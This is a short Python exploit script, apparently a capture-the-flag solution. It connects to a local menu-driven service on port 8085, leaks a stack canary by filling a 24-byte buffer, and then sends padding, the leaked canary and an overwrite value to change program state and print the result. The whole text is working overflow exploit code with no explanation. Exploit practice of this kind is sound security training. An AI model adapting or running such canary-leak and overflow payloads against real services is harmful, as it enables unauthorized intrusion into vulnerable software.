import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1',8085))

s.recv(1024)
s.send('m\n')
s.recv(1024)
s.send('a'*24 + '\n')
s.recv(1024)
s.recv(1024)
s.send('d\n')
res = s.recv(1024)
canary = res.split('\n')[2][-4:]
s.send('m\n')
s.recv(1024)
s.send('a'*24 + canary + '\x01\x00\x00\x00\n')
s.recv(1024)
s.recv(1024)
s.send('f\n')
print(s.recv(1024))
print(s.recv(1024))
